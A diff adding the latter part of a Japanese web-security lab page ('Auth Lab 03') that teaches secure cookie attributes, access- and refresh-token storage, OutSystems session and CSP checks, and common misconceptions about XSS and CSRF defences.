+        <td><span class="tag-good">推奨</span></td>
+      </tr>
+      <tr>
+        <td><code>Max-Age</code></td>
+        <td>有効期限（秒数）。Session Cookieを避ける</td>
+        <td><code>Max-Age=3600</code></td>
+        <td><span class="tag-good">推奨</span></td>
+      </tr>
+      <tr>
+        <td><code>Path=/api</code></td>
+        <td>送信先パスを制限（最小権限）</td>
+        <td><code>Path=/api</code></td>
+        <td><span class="tag-warn">推奨</span></td>
+      </tr>
+      <tr>
+        <td><code>__Host-</code> プレフィックス</td>
+        <td>Domain 指定を禁止・Path=/ 必須・Secure 必須を強制</td>
+        <td><code>__Host-session=...</code></td>
+        <td><span class="tag-good">最高レベル</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3><code>__Host-</code> プレフィックスとは</h3>
+  <div class="note">
+    <strong>Cookie プレフィックスによるセキュリティ強化</strong><br>
+    <code>__Host-</code> プレフィックスを付けた Cookie は、ブラウザが以下を強制します:<br>
+    • <code>Secure</code> 属性が必須（HTTP では設定も送信もできない）<br>
+    • <code>Domain</code> 属性が禁止（特定ドメインへの限定が不可能 = より安全）<br>
+    • <code>Path=/</code> が必須（パスによる絞り込みを無効化）<br><br>
+    サブドメインテイクオーバー攻撃などへの耐性が向上します。
+  </div>
+
+  <h3>セキュアCookie 設定例（推奨と非推奨の比較）</h3>
+
+  <div class="two-col">
+    <div class="col-card">
+      <h4>❌ 非推奨（脆弱な設定）</h4>
+      <pre style="background:transparent; border:none; padding:0; font-size:0.78rem;">Set-Cookie: session=abc123</pre>
+      <p style="margin-top:0.5rem; font-size:0.78rem; color:var(--danger);">
+        問題点:<br>
+        • XSSで読み取り可能（HttpOnly なし）<br>
+        • HTTP経由で送信される（Secure なし）<br>
+        • CSRF攻撃に脆弱（SameSite なし）<br>
+        • 有効期限なし（セッション依存）
+      </p>
+    </div>
+    <div class="col-card">
+      <h4>✅ 推奨（セキュアな設定）</h4>
+      <pre style="background:transparent; border:none; padding:0; font-size:0.78rem;">Set-Cookie: __Host-session=abc123;
+  HttpOnly;
+  Secure;
+  SameSite=Strict;
+  Max-Age=3600;
+  Path=/</pre>
+      <p style="margin-top:0.5rem; font-size:0.78rem; color:var(--accent2);">
+        改善点:<br>
+        • HttpOnly → XSS耐性<br>
+        • Secure → HTTPS必須<br>
+        • SameSite=Strict → CSRF対策<br>
+        • Max-Age → 1時間で自動失効<br>
+        • __Host- → サブドメイン保護
+      </p>
+    </div>
+  </div>
+
+  <h3>セキュア Cookie 検証</h3>
+  <div style="margin:1rem 0; text-align:center;">
+    <button class="btn btn-accent2" onclick="analyzeCurrentCookies()">現在のページの Cookie を分析</button>
+  </div>
+  <div id="cookie-analysis" class="result-area">
+    <pre id="cookie-output" class="placeholder">▶ ボタンをクリックして Cookie を分析します</pre>
+  </div>
+
+  <script>
+  function analyzeCurrentCookies() {
+    const cookies = document.cookie.split(';').map(c => c.trim()).filter(Boolean);
+    const lines = [
+      '=== JavaScript から見えるCookie一覧 ===',
+      '（HttpOnly Cookieはここに表示されません）',
+      '',
+    ];
+
+    if (cookies.length === 0) {
+      lines.push('Cookieなし（または全てHttpOnly）');
+      lines.push('');
+      lines.push('→ HttpOnly Cookieがある場合は以下で確認:');
+      lines.push('  DevTools (F12) → Application → Cookies');
+    } else {
+      lines.push('見えるCookie: ' + cookies.length + '件');
+      lines.push('');
+      cookies.forEach(c => {
+        const name = c.split('=')[0];
+        const isSecure = name.startsWith('__Secure-') || name.startsWith('__Host-');
+        lines.push('  ' + c.substring(0, 60) + (c.length > 60 ? '...' : ''));
+        if (isSecure) lines.push('  ✅ セキュアプレフィックスあり');
+        else lines.push('  ⚠ HttpOnly/SameSite等はJS確認不可 → DevToolsで確認を');
+      });
+    }
+
+    lines.push('');
+    lines.push('DevToolsでの確認手順:');
+    lines.push('  F12 → Application → Storage → Cookies → ' + location.origin);
+    lines.push('  各CookieのHttpOnly / SameSite / Secure 列を確認');
+
+    document.getElementById('cookie-output').textContent = lines.join('\n');
+    document.getElementById('cookie-output').className = '';
+  }
+  </script>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-E: トークン管理ベストプラクティス       -->
+<!-- ============================================ -->
+<h2 id="exp-auth3e">Auth3-E: トークン管理ベストプラクティス</h2>
+
+<div class="lab-box">
+  <h3>アクセストークンとリフレッシュトークンの安全な管理</h3>
+
+  <div class="diagram">トークン管理アーキテクチャ（推奨パターン）
+
+  ┌──────────────────────────────────────────────────────────────┐
+  │                      ブラウザ側                               │
+  │                                                              │
+  │  ┌─────────────────────┐   ┌─────────────────────────────┐ │
+  │  │  メモリ（変数）       │   │  HttpOnly Cookie            │ │
+  │  │  アクセストークン     │   │  リフレッシュトークン        │ │
+  │  │  有効期限: 15分       │   │  SameSite=Strict            │ │
+  │  │  XSS: 安全           │   │  Secure; Max-Age=604800     │ │
+  │  │  ページ離脱で消える   │   │  XSS: 安全（JS読み取り不可）│ │
+  │  └──────────┬──────────┘   └──────────────┬──────────────┘ │
+  │             │                              │               │
+  └─────────────┼──────────────────────────────┼───────────────┘
+                │ Authorization: Bearer ...     │ Cookie: refresh=...
+                ▼                              ▼
+          API サーバー              /auth/refresh エンドポイント
+          （リソース取得）          （新しいアクセストークン発行）</div>
+
+  <h3>トークンローテーションとログアウト実装</h3>
+  <pre><span class="comment">// ===== 推奨パターン: トークンのメモリ管理 =====</span>
+<span class="kw">let</span> accessToken = <span class="kw">null</span>; <span class="comment">// メモリのみ（ページ離脱で消える）</span>
+
+<span class="comment">// ログイン: アクセストークンはメモリ、リフレッシュはサーバーがCookieに設定</span>
+<span class="kw">async function</span> login(email, password) {
+  <span class="kw">const</span> res = <span class="kw">await</span> fetch(<span class="str">'/auth/login'</span>, {
+    method: <span class="str">'POST'</span>,
+    credentials: <span class="str">'include'</span>, <span class="comment">// HttpOnly CookieをAPIへ送信</span>
+    headers: { <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span> },
+    body: JSON.stringify({ email, password })
+  });
+  <span class="kw">const</span> data = <span class="kw">await</span> res.json();
+  accessToken = data.access_token; <span class="comment">// メモリに保存（lsには入れない）</span>
+  <span class="comment">// refresh_token は Set-Cookie で HttpOnly Cookie に自動保存済み</span>
+}
+
+<span class="comment">// APIリクエスト: Authorizationヘッダーでアクセストークンを送信</span>
+<span class="kw">async function</span> apiFetch(path) {
+  <span class="kw">const</span> res = <span class="kw">await</span> fetch(path, {
+    credentials: <span class="str">'include'</span>,
+    headers: { <span class="str">'Authorization'</span>: <span class="str">'Bearer '</span> + accessToken }
+  });
+  <span class="kw">if</span> (res.status === 401) {
+    <span class="kw">await</span> refreshTokens(); <span class="comment">// 401 なら自動リフレッシュ</span>
+    <span class="kw">return</span> apiFetch(path);  <span class="comment">// リトライ</span>
+  }
+  <span class="kw">return</span> res.json();
+}
+
+<span class="comment">// ログアウト: アクセストークンをクリア + サーバーにリフレッシュトークン失効を依頼</span>
+<span class="kw">async function</span> logout() {
+  <span class="kw">await</span> fetch(<span class="str">'/auth/logout'</span>, { method: <span class="str">'POST'</span>, credentials: <span class="str">'include'</span> });
+  accessToken = <span class="kw">null</span>; <span class="comment">// メモリのアクセストークンをクリア</span>
+  <span class="comment">// サーバー側: リフレッシュトークンをDB等から削除 + Cookie Max-Age=0 で即時失効</span>
+}</pre>
+
+  <h3>トークン有効期限の設計指針</h3>
+
+  <table class="compare-table">
+    <thead>
+      <tr>
+        <th>トークン種別</th>
+        <th>推奨有効期限</th>
+        <th>保存場所</th>
+        <th>理由</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>アクセストークン</td>
+        <td>5〜15 分</td>
+        <td>メモリ（変数）</td>
+        <td>短い有効期限で盗まれても被害を最小化</td>
+      </tr>
+      <tr>
+        <td>リフレッシュトークン</td>
+        <td>7〜30 日</td>
+        <td>HttpOnly Cookie</td>
+        <td>長期セッション維持。ローテーションで使い捨て</td>
+      </tr>
+      <tr>
+        <td>ID トークン（OIDC）</td>
+        <td>1 時間</td>
+        <td>メモリ</td>
+        <td>表示用途のみ。署名検証後に使用</td>
+      </tr>
+      <tr>
+        <td>API キー</td>
+        <td>無期限（ローテーション運用）</td>
+        <td>環境変数（サーバー）</td>
+        <td>クライアントには渡さない。定期的に再発行</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- Auth3-F: OutSystems セキュリティ確認          -->
+<!-- ============================================ -->
+<h2 id="exp-auth3f">Auth3-F: OutSystems でのセキュリティ確認</h2>
+
+<div class="lab-box">
+  <h3>OutSystems Traditional Web — セッション Cookie の確認</h3>
+
+  <div class="note">
+    OutSystems の Traditional Web アプリは、ログイン後に <code>nr1.session</code> Cookie を発行します。
+    この Cookie には <code>HttpOnly</code> / <code>SameSite=Lax</code> / <code>Secure</code>（HTTPS環境）が
+    設定されており、XSS・CSRF への標準的な対策が施されています。
+  </div>
+
+  <div class="step">
+    <div class="step-num">確認手順: nr1.session Cookie の属性を DevTools で見る</div>
+    <p style="font-size:0.85rem; margin-top:0.5rem;">
+      1. OutSystems アプリにログインした状態で F12 → <strong>Application</strong> タブを開く<br>
+      2. 左ペインの <strong>Storage → Cookies → アプリのURL</strong> をクリック<br>
+      3. <code>nr1.session</code> を探して各属性を確認:<br>
+      &nbsp;&nbsp;&nbsp;• <strong>HttpOnly</strong>: ✓（チェックが入っていること）<br>
+      &nbsp;&nbsp;&nbsp;• <strong>SameSite</strong>: <code>Lax</code><br>
+      &nbsp;&nbsp;&nbsp;• <strong>Secure</strong>: HTTPS環境では ✓<br>
+      &nbsp;&nbsp;&nbsp;• <strong>Path</strong>: <code>/</code>
+    </p>
+  </div>
+
+  <h3>OutSystems Reactive Web — API認証の確認</h3>
+
+  <div class="step">
+    <div class="step-num">確認手順: REST API リクエストの認証ヘッダーを確認する</div>
+    <p style="font-size:0.85rem; margin-top:0.5rem;">
+      1. DevTools → <strong>Network</strong> タブ → <code>XHR</code> でフィルタ<br>
+      2. ページ操作（ログイン・データ取得など）を実行<br>
+      3. <code>/screenservices/</code> や <code>/rest/</code> へのリクエストを選択<br>
+      4. <strong>Request Headers</strong> を確認:<br>
+      &nbsp;&nbsp;&nbsp;• <code>X-CSRFToken</code>（OutSystemsのCSRF対策トークン）<br>
+      &nbsp;&nbsp;&nbsp;• <code>Cookie: nr2.session=...</code>（Reactive Webのセッション）<br>
+      5. <strong>Response Headers</strong> の <code>Set-Cookie</code> を確認して属性をチェック
+    </p>
+  </div>
+
+  <div class="note">
+    <strong>OutSystems Reactive Web と Traditional Web の Cookie の違い</strong><br>
+    <table style="width:100%; border-collapse:collapse; font-size:0.82rem; margin-top:0.5rem;">
+      <thead>
+        <tr style="background:var(--code-bg);">
+          <th style="padding:0.4rem 0.6rem; border:1px solid var(--border);">アーキテクチャ</th>
+          <th style="padding:0.4rem 0.6rem; border:1px solid var(--border);">Cookie名</th>
+          <th style="padding:0.4rem 0.6rem; border:1px solid var(--border);">特徴</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);">Traditional Web</td>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);"><code>nr1.session</code></td>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);">SSR（サーバーサイドレンダリング）のセッション管理</td>
+        </tr>
+        <tr>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);">Reactive Web</td>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);"><code>nr2.session</code></td>
+          <td style="padding:0.4rem 0.6rem; border:1px solid var(--border);">CSR（クライアントサイド）+ REST API 認証。SPA構成</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>OutSystems CSP（Content Security Policy）の設定確認</h3>
+  <div style="margin:1rem 0; text-align:center;">
+    <button class="btn btn-accent2" onclick="checkCSP()">このページのCSP ヘッダーを確認</button>
+  </div>
+  <div id="csp-result" class="result-area">
+    <pre id="csp-output" class="placeholder">▶ ボタンをクリックして確認します</pre>
+  </div>
+
+  <script>
+  function checkCSP() {
+    const metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+    const lines = [
+      '=== Content Security Policy チェック ===',
+      '',
+    ];
+    if (metas.length > 0) {
+      lines.push('✅ CSP メタタグ検出: ' + metas.length + '件');
+      metas.forEach(m => lines.push('  ' + m.getAttribute('content')));
+    } else {
+      lines.push('⚠ このページにCSP メタタグはありません。');
+      lines.push('  HTTPレスポンスヘッダーに設定されている可能性があります。');
+      lines.push('');
+      lines.push('確認方法:');
+      lines.push('  DevTools → Network → ページのリクエストを選択');
+      lines.push('  Response Headers → Content-Security-Policy を確認');
+    }
+    lines.push('');
+    lines.push('XSS対策としてCSPで推奨される設定:');
+    lines.push("  Content-Security-Policy: default-src 'self';");
+    lines.push("    script-src 'self' 'nonce-RANDOM';");
+    lines.push("    object-src 'none';");
+    lines.push("    base-uri 'self';");
+
+    document.getElementById('csp-output').textContent = lines.join('\n');
+    document.getElementById('csp-output').className = '';
+  }
+  </script>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- よくある間違い                               -->
+<!-- ============================================ -->
+<div class="lab-box" id="mistakes" style="border-left:4px solid var(--danger);">
+  <h3>⚠️ よくある間違い — セキュリティ実践編</h3>
+
+  <div style="margin-top:0.8rem;">
+    <p><strong>❌ 間違い1: 「HttpOnly Cookie にすれば XSS は完全に防げる」</strong></p>
+    <div class="note" style="background:#fff8f8; border-color:#f5a0a0; color:#7a0000; margin:0.4rem 0;">
+      HttpOnly Cookie は「Cookie の中身を JavaScript で読めなくする」だけです。XSS 自体は依然として発生します。
+      攻撃者は Cookie を読めなくても、XSS を使って:<br>
+      • 偽のログインフォームを表示してパスワードを盗む<br>
+      • CSRF リクエストをユーザーのブラウザから送信させる<br>
+      • DOM を操作して被害者を操作する<br>
+      などを行えます。<br>
+      <strong>正しい理解:</strong> HttpOnly Cookie は <em>Cookie 窃取</em>への対策。XSS そのものの対策は
+      出力エスケープ・CSP・DOMPurify 等の XSS 防止策が必要です。
+    </div>
+  </div>
+
+  <div style="margin-top:0.8rem;">
+    <p><strong>❌ 間違い2: 「HTTPS を使っているから盗聴されない = CSRF も防げる」</strong></p>
+    <div class="note" style="background:#fff8f8; border-color:#f5a0a0; color:#7a0000; margin:0.4rem 0;">
+      HTTPS は通信の暗号化（盗聴対策）です。CSRF は被害者のブラウザが自発的に送るリクエストなので、
+      HTTPS でも発生します。CSRF 対策（CSRF トークン / SameSite Cookie）は別途必要です。
+    </div>
+  </div>
+
+  <div style="margin-top:0.8rem;">
+    <p><strong>❌ 間違い3: 「JWTはPayloadが暗号化されているから安全」</strong></p>
+    <div class="note" style="background:#fff8f8; border-color:#f5a0a0; color:#7a0000; margin:0.4rem 0;">
+      JWT の Payload は <strong>Base64URL エンコード</strong>であり、暗号化ではありません。
+      誰でもデコードして中身を読めます（<code>atob(payload)</code> で確認可能）。
+      JWTの署名（Signature）は「改ざんされていないことの証明」であり、「秘密にする」仕組みではありません。
+      個人情報・権限情報を Payload に入れる場合は JWE（JSON Web Encryption）で別途暗号化が必要です。
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- まとめ                                       -->
+<!-- ============================================ -->
+<div class="lab-box" id="summary" style="border-left:4px solid var(--accent3);">
+  <h3>📋 まとめ — セキュリティ実践 チェックポイント</h3>
+  <table style="width:100%; border-collapse:collapse; font-size:0.85rem; margin-top:0.8rem;">
+    <thead>
+      <tr style="background:var(--surface2); color:var(--accent3);">
+        <th style="padding:0.5rem 0.7rem; border:1px solid var(--border);">対策</th>
+        <th style="padding:0.5rem 0.7rem; border:1px solid var(--border);">対象攻撃</th>
+        <th style="padding:0.5rem 0.7rem; border:1px solid var(--border);">実装方法</th>
+        <th style="padding:0.5rem 0.7rem; border:1px solid var(--border);">優先度</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="background:#e8f5e9;">
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">HttpOnly Cookie</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">XSS による Cookie 窃取</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);"><code>Set-Cookie: ...; HttpOnly</code></td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-good">必須</span></td>
+      </tr>
+      <tr>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">SameSite=Strict</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">CSRF</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);"><code>Set-Cookie: ...; SameSite=Strict</code></td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-good">必須</span></td>
+      </tr>
+      <tr style="background:#e8f5e9;">
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">CSRF トークン</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">CSRF（SameSite=Laxの補完）</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">hidden field / カスタムヘッダー</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-good">推奨</span></td>
+      </tr>
+      <tr>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">出力エスケープ / DOMPurify</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">XSS そのもの</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">HTMLエスケープ / ライブラリ</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-good">必須</span></td>
+      </tr>
+      <tr style="background:#e8f5e9;">
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">CSP（Content-Security-Policy）</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">XSS の実行制限</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">HTTPレスポンスヘッダー</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-warn">推奨</span></td>
+      </tr>
+      <tr>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">Secure Cookie + HTTPS</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">通信盗聴</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);"><code>Set-Cookie: ...; Secure</code></td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-good">必須</span></td>
+      </tr>
+      <tr style="background:#e8f5e9;">
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">アクセストークンの短期化</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">トークン窃取後の長期悪用</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border);">有効期限 5〜15分 + リフレッシュ</td>
+        <td style="padding:0.45rem 0.7rem; border:1px solid var(--border); text-align:center;"><span class="tag-warn">推奨</span></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- チェックリスト                               -->
+<!-- ============================================ -->
+<div class="note" style="border-color:var(--accent3);background:#f3e8fd;">
+  🔗 <strong style="color:var(--accent3);">多層防御クロスリファレンス</strong>：
+  このLabで学んだ CSRF/XSS 防御は、<a href="web-auth-lab-01.html">Lab 01</a> の認証フロー（HttpOnly Cookie, Bearer トークン）と <a href="web-auth-lab-02.html">Lab 02</a> の MFA（パスキーはフィッシング耐性あり）を組み合わせることで、多層防御が完成します。
+  <br><strong>1つが突破されても他の層が攻撃を阻止</strong>する設計を心がけてください。
+</div>
+
+<h2 id="checklist">✅ Auth Lab 03 チェックリスト</h2>
+<p style="font-size:0.82rem; color:var(--text-dim);">チェック状態はブラウザに自動保存されます。</p>
+
+<div class="check-item"><input type="checkbox" data-key="auth3-1"> <label>CSRF 攻撃の仕組み（セッションCookieの自動送信による誤送信）を説明できる</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-2"> <label>CSRF トークンが「同一オリジンポリシー」によって攻撃者に読まれない仕組みを理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-3"> <label>SameSite=Lax と SameSite=Strict の動作の違いを説明できる</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-4"> <label>XSS で localStorage のトークンが盗まれるシナリオを体験した</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-5"> <label>HttpOnly Cookie が JavaScript から読み取れないことを確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-6"> <label>Cookie の HttpOnly / Secure / SameSite / Max-Age 各属性の役割を説明できる</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-7"> <label>__Host- プレフィックスの意味と利点を理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-8"> <label>アクセストークンをメモリに保存し、リフレッシュトークンを HttpOnly Cookie に保存する設計を理解した</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-9"> <label>「HttpOnly Cookie で XSS が完全に防げる」という誤解を説明・訂正できる</label></div>
+<div class="check-item"><input type="checkbox" data-key="auth3-10"> <label>OutSystems の nr1.session / nr2.session Cookie の属性を DevTools で確認した</label></div>
+
+<div style="margin-top:1rem; text-align:center;">
+  <span id="progress-text" style="font-family:'IBM Plex Mono',monospace; color:var(--accent); font-size:0.9rem;"></span>
+</div>
+
+<script>
+  const STORAGE_PREFIX = 'auth3lab_';
+
+  function updateProgress() {
+    const all = document.querySelectorAll('input[type="checkbox"][data-key]');
+    const checked = [...all].filter(cb => cb.checked).length;
+    const el = document.getElementById('progress-text');
+    if (el) {
+      el.textContent = checked + ' / ' + all.length + ' 完了';
+      if (checked === all.length) {
+        el.textContent += ' 🎉 Auth Lab 03 完了！';
+      }
+    }
+  }
+
+  document.querySelectorAll('input[type="checkbox"][data-key]').forEach(cb => {
+    const saved = localStorage.getItem(STORAGE_PREFIX + cb.dataset.key);
+    if (saved === 'true') {
+      cb.checked = true;
+      cb.closest('.check-item')?.classList.add('checked');
+    }
+    cb.addEventListener('change', () => {
+      localStorage.setItem(STORAGE_PREFIX + cb.dataset.key, cb.checked);
+      cb.closest('.check-item')?.classList.toggle('checked', cb.checked);
+      updateProgress();
+    });
+  });
+
+  updateProgress();
+</script>
+
+<hr>
+<h2 id="framework">🔧 フレームワーク別セキュリティ設定例</h2>
+<p style="font-size:0.85rem;color:var(--text-dim);">このLabで学んだセキュリティ対策を各環境で設定する方法です。</p>
+
+<div style="overflow-x:auto;">
+<table style="width:100%;border-collapse:collapse;font-size:0.78rem;font-family:'IBM Plex Mono',monospace;margin:1rem 0;">
+  <thead>
+    <tr style="background:var(--surface2);color:var(--accent2);">
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;min-width:120px;">対策</th>
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;">Express</th>
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;">OutSystems</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">CSRF</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>csurf({ cookie: true })</code></td>
+      <td style="padding:0.6rem;border:1px solid var(--border);">プラットフォーム内蔵（自動トークン）</td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">XSS防止</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>helmet.contentSecurityPolicy()</code></td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>EncodeHtml()</code> / HTTPSecurityPolicy</td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Cookie設定</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>res.cookie('s', v, { secure:true, httpOnly:true, sameSite:'lax' })</code></td>
+      <td style="padding:0.6rem;border:1px solid var(--border);">Factory Configuration / web.config</td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">HSTS</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>helmet.hsts({ maxAge: 63072000 })</code></td>
+      <td style="padding:0.6rem;border:1px solid var(--border);">IIS / LifeTime設定</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<hr>
+
+<!-- ============================================ -->
+<!-- 学習ノート                                   -->
+<!-- ============================================ -->
+<div class="lab-box" style="border-color:var(--warn);">
+  <h3 style="color:var(--warn);margin-top:0;">🚀 本番環境で確認すべきこと</h3>
+  <p style="font-size:0.82rem;color:var(--text-dim);">このLabの内容をデプロイ前に確認するチェックリストです。</p>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ CSRF トークンをすべての状態変更リクエスト（POST/PUT/DELETE）に含めている</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ セッション Cookie に <code>SameSite=Lax</code> 以上を設定している</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ ユーザー入力を HTML 出力する際にエスケープ処理している（XSS 防止）</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>Content-Security-Policy</code> で <code>'unsafe-inline'</code> を使用していない</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>__Host-</code> プレフィックス付き Cookie を使用している</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ セキュリティヘッダー（HSTS, nosniff, Referrer-Policy）を設定している</div>
+</div>
+
+<div class="note">
+  📖 <strong>参照資料</strong>：このLabの内容は <code>WebAuthorization.md</code> の 第2章（セッション認証のセキュリティ）、第7章（トークン保存とXSS）、第3章（JWT + CSRF対策）、付録（Cookie属性リファレンス） に対応しています。より詳しい解説・コード例はガイドを参照してください。
+</div>
+
+<h2 id="note">📝 学習ノート</h2>
+<div class="lab-box">
+  <p style="font-size:0.85rem; color:var(--text-dim); margin-bottom:0.5rem;">気づいたこと・疑問・まとめをメモしてください（ブラウザに自動保存）</p>
+  <textarea class="note-textarea" id="lab-note" placeholder="例: XSSとCSRFの違い: XSSはスクリプト注入、CSRFはCookieの自動送信を悪用。&#10;HttpOnly Cookieの限界: Cookie自体の盗難は防げるが、XSSのDOM操作は防げない。&#10;&#10;疑問: RefreshTokenローテーションはどのタイミングで実施する？" oninput="saveNote()"></textarea>
+  <div class="save-indicator" id="note-saved"></div>
+</div>
+
+<script>
+(function loadNote() {
+  const val = localStorage.getItem('auth3-lab-note');
+  if (val) document.getElementById('lab-note').value = val;
+})();
+
+let noteSaveTimer = null;
+function saveNote() {
+  clearTimeout(noteSaveTimer);
+  noteSaveTimer = setTimeout(() => {
+    localStorage.setItem('auth3-lab-note', document.getElementById('lab-note').value);
+    const ind = document.getElementById('note-saved');
+    ind.textContent = '保存しました ✅';
+    setTimeout(() => { ind.textContent = ''; }, 2000);
+  }, 800);
+}
+</script>
+
+<!-- ============================================ -->
+<!-- 前後ナビゲーション                           -->
+<!-- ============================================ -->
+<p style="color:var(--text-dim); font-size:0.82rem; margin-top:2rem;">
+  ← 前回: <a href="web-auth-lab-02.html"><strong>Auth Lab 02 — MFA・パスキー</strong></a><br>
+  これが最後のLabです。全3 Auth Lab お疲れさまでした！
+</p>
+
+<div class="nav-lab">
+  <a href="web-auth-lab-02.html">← Auth Lab 02: MFA・パスキー</a>
+  <span style="color:var(--text-dim); font-size:0.82rem;">Auth Lab 03 / セキュリティ実践</span>
+  <a href="web-auth-index.html">インデックスに戻る →</a>
+</div>
+
+</body>
+</html>
